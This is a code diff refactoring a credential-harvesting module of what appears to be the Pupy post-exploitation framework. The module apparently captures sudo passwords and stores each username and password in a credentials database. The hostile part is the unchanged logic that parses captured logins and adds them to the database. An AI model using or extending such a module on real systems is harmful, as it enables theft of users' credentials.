@@ -1,5 +1,6 @@
 # -*- coding: utf-8 -*-
-from pupylib.PupyModule import *
+
+from pupylib.PupyModule import config, PupyModule, PupyArgumentParser
 from pupylib.utils.credentials import Credentials
 
 __class_name__="SudoAlias"
@@ -10,9 +11,10 @@ class SudoAlias(PupyModule):
 
     dependencies = ['sudo_alias']
 
-    def init_argparse(self):
-        self.arg_parser = PupyArgumentParser(prog="sudo_alias", description=self.__doc__)
-        self.arg_parser.add_argument('action', choices=['start', 'stop', 'dump'])
+    @classmethod
+    def init_argparse(cls):
+        cls.arg_parser = PupyArgumentParser(prog="sudo_alias", description=cls.__doc__)
+        cls.arg_parser.add_argument('action', choices=['start', 'stop', 'dump'])
 
     def run(self, args):
         if args.action=="start":
@@ -30,7 +32,7 @@ class SudoAlias(PupyModule):
                 # add password to the database
                 username = data.split('/')[0]
                 password = data.replace(username, '')[1:]
-                db = Credentials(client=self.client.short_name(), config=self.config)
+                db = Credentials(client=self.client, config=self.config)
                 db.add([{
                     'Login': username,
                     'password':password,
